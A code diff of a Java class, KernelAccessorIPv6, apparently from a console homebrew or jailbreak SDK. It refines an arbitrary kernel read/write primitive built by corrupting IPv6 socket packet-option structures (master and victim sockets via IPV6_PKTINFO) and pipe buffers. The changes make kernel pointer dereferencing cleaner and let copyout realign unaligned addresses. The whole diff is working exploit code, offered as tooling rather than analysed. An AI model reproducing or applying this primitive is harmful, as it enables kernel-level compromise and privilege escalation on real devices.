@@ -73,17 +73,17 @@ public class KernelAccessorIPv6 implements KernelAccessor {
         KernelPointer master_sock_filedescent_addr = ofilesAddress.inc(master_sock * 0x30L);
         KernelPointer victim_sock_filedescent_addr = ofilesAddress.inc(victim_sock * 0x30L);
 
-        KernelPointer master_sock_file_addr = KernelPointer.valueOf(master_sock_filedescent_addr.read8());
-        KernelPointer victim_sock_file_addr = KernelPointer.valueOf(victim_sock_filedescent_addr.read8());
+        KernelPointer master_sock_file_addr = master_sock_filedescent_addr.pptr(0);
+        KernelPointer victim_sock_file_addr = victim_sock_filedescent_addr.pptr(0);
 
-        KernelPointer master_sock_socket_addr = KernelPointer.valueOf(master_sock_file_addr.read8());
-        KernelPointer victim_sock_socket_addr = KernelPointer.valueOf(victim_sock_file_addr.read8());
+        KernelPointer master_sock_socket_addr = master_sock_file_addr.pptr(0);
+        KernelPointer victim_sock_socket_addr = victim_sock_file_addr.pptr(0);
 
-        KernelPointer master_pcb = KernelPointer.valueOf(master_sock_socket_addr.read8(0x18));
-        KernelPointer slave_pcb = KernelPointer.valueOf(victim_sock_socket_addr.read8(0x18));
+        KernelPointer master_pcb = master_sock_socket_addr.pptr(0x18);
+        KernelPointer slave_pcb = victim_sock_socket_addr.pptr(0x18);
 
-        KernelPointer master_pktopts = KernelPointer.valueOf(master_pcb.read8(0x120));
-        KernelPointer slave_pktopts = KernelPointer.valueOf(slave_pcb.read8(0x120));
+        KernelPointer master_pktopts = master_pcb.pptr(0x120);
+        KernelPointer slave_pktopts = slave_pcb.pptr(0x120);
 
         master_pktopts.write8(0x10, slave_pktopts.inc(0x10).addr());
 
@@ -153,13 +153,21 @@ public class KernelAccessorIPv6 implements KernelAccessor {
     }
 
     private void ipv6_kread(KernelPointer kernelAddress, Pointer buffer) throws SdkException {
-        write_to_victim(kernelAddress);
-        socket.getSocketOptionsIPv6(victim_sock, OptionIPv6.IPV6_PKTINFO, buffer);
+        try {
+            write_to_victim(kernelAddress);
+            socket.getSocketOptionsIPv6(victim_sock, OptionIPv6.IPV6_PKTINFO, buffer);
+        } catch (SdkException e) {
+            throw new SdkException(ErrorMessages.getClassErrorMessage(getClass(), "ipv6_kread", kernelAddress, buffer), e);
+        }
     }
 
     private void ipv6_kwrite(KernelPointer kernelAddress, Pointer buffer) throws SdkException {
-        write_to_victim(kernelAddress);
-        socket.setSocketOptionsIPv6(victim_sock, OptionIPv6.IPV6_PKTINFO, buffer);
+        try {
+            write_to_victim(kernelAddress);
+            socket.setSocketOptionsIPv6(victim_sock, OptionIPv6.IPV6_PKTINFO, buffer);
+        } catch (SdkException e) {
+            throw new SdkException(ErrorMessages.getClassErrorMessage(getClass(), "ipv6_kwrite", kernelAddress, buffer), e);
+        }
     }
 
     private long ipv6_kread8(KernelPointer kernelAddress) throws SdkException {
@@ -167,7 +175,7 @@ public class KernelAccessorIPv6 implements KernelAccessor {
         return slave_buffer.read8();
     }
 
-    private synchronized void copyout(long src, Pointer dest, long length) throws SdkException {
+    private synchronized int copyout(long src, long length) throws SdkException {
         final long value0 = 0x4000000040000000L;
         final long value1 = 0x4000000000000000L;
 
@@ -176,18 +184,30 @@ public class KernelAccessorIPv6 implements KernelAccessor {
         pipemap_buffer.write4(0x10, 0);
         ipv6_kwrite(pipe_addr, pipemap_buffer);
 
-        pipemap_buffer.write8(src);
+        // ipv6 bypass fails on some non-aligned pointers
+        // When the read is not aligned to 4-byte boundary -> realign and keep track of offset
+        long srcAligned = src & -4;
+        int srcOffset = (int) (src - srcAligned);
+        long lengthAligned = (src + length + 3) / 4 * 4 - srcAligned;
+
+        if (lengthAligned > Param.PAGE_SIZE) {
+            throw new SdkException(ErrorMessages.getClassErrorMessage(getClass(), "copyout.unalignedPageRead", "0x" + Long.toHexString(src)));
+        }
+
+        pipemap_buffer.write8(srcAligned);
         pipemap_buffer.write8(0x8, 0);
         pipemap_buffer.write4(0x10, 0);
         ipv6_kwrite(pipe_addr.inc(0x10), pipemap_buffer);
 
-        long readCount = this.libKernel.read(pipe_fd[0], dest, length);
-        if (readCount != length) {
+        long readCount = this.libKernel.read(pipe_fd[0], krw_buffer, lengthAligned);
+        if (readCount != lengthAligned) {
             if (readCount == -1) {
                 throw errNo.getLastException(getClass(), "copyout", new Long(length), "0x" + Long.toHexString(src));
             }
             throw new SdkException(ErrorMessages.getClassErrorMessage(getClass(), "copyout.count", new Long(readCount), new Long(length), "0x" + Long.toHexString(src)));
         }
+
+        return srcOffset;
     }
 
     private synchronized void copyin(Pointer src, long dest, long length) throws SdkException {
@@ -197,6 +217,10 @@ public class KernelAccessorIPv6 implements KernelAccessor {
         pipemap_buffer.write8(0x8, value);
         pipemap_buffer.write4(0x10, 0);
         ipv6_kwrite(pipe_addr, pipemap_buffer);
+
+        // Note, write can likely fail the same way as read if dest is not aligned a certain way.
+        // But realigning is more difficult since it requires knowing missing bytes.
+        // For now, this code just lets this situation fail.
 
         pipemap_buffer.write8(dest);
         pipemap_buffer.write8(0x8, 0);
@@ -214,16 +238,16 @@ public class KernelAccessorIPv6 implements KernelAccessor {
 
     private void inc_socket_refcount(int target_fd, KernelPointer ofilesAddress) {
         KernelPointer filedescent_addr = ofilesAddress.inc(target_fd * 0x30L);
-        KernelPointer file_addr = KernelPointer.valueOf(filedescent_addr.read8(0x00));
-        KernelPointer file_data_addr = KernelPointer.valueOf(file_addr.read8(0x00));
+        KernelPointer file_addr = filedescent_addr.pptr(0x00);
+        KernelPointer file_data_addr = file_addr.pptr(0x00);
         file_data_addr.write4(0x100);
     }
 
     @Override
     public byte read1(long kernelAddress) {
         try {
-            copyout(kernelAddress, krw_buffer, 0x1);
-            return krw_buffer.read1();
+            long readOffset = copyout(kernelAddress, 0x1);
+            return krw_buffer.read1(readOffset);
         } catch (SdkException e) {
             throw new SdkRuntimeException(e);
         }
@@ -232,8 +256,8 @@ public class KernelAccessorIPv6 implements KernelAccessor {
     @Override
     public short read2(long kernelAddress) {
         try {
-            copyout(kernelAddress, krw_buffer, 0x2);
-            return krw_buffer.read2();
+            long readOffset = copyout(kernelAddress, 0x2);
+            return krw_buffer.read2(readOffset);
         } catch (SdkException e) {
             throw new SdkRuntimeException(e);
         }
@@ -242,8 +266,8 @@ public class KernelAccessorIPv6 implements KernelAccessor {
     @Override
     public int read4(long kernelAddress) {
         try {
-            copyout(kernelAddress, krw_buffer, 0x4);
-            return krw_buffer.read4();
+            long readOffset = copyout(kernelAddress, 0x4);
+            return krw_buffer.read4(readOffset);
         } catch (SdkException e) {
             throw new SdkRuntimeException(e);
         }
@@ -252,8 +276,8 @@ public class KernelAccessorIPv6 implements KernelAccessor {
     @Override
     public long read8(long kernelAddress) {
         try {
-            copyout(kernelAddress, krw_buffer, 0x8);
-            return krw_buffer.read8();
+            long readOffset = copyout(kernelAddress, 0x8);
+            return krw_buffer.read8(readOffset);
         } catch (SdkException e) {
             throw new SdkRuntimeException(e);
         }
@@ -278,13 +302,13 @@ public class KernelAccessorIPv6 implements KernelAccessor {
         int srcOffset = 0;
         int targetOffset = offset;
         while (srcOffset < length) {
-            int readSize = (int) Param.PAGE_SIZE;
+            int readSize = (int) Param.PAGE_SIZE - (kernelAddress % 4 != 0 ? 4 : 0);
             if ((srcOffset + readSize) > length) {
                 readSize = length - srcOffset;
             }
             try {
-                copyout(kernelAddress + srcOffset, krw_buffer, readSize);
-                krw_buffer.read(0, buffer, targetOffset, readSize);
+                int readOffset = copyout(kernelAddress + srcOffset, readSize);
+                krw_buffer.read(readOffset, buffer, targetOffset, readSize);
                 srcOffset += readSize;
                 targetOffset += readSize;
             } catch (SdkException e) {
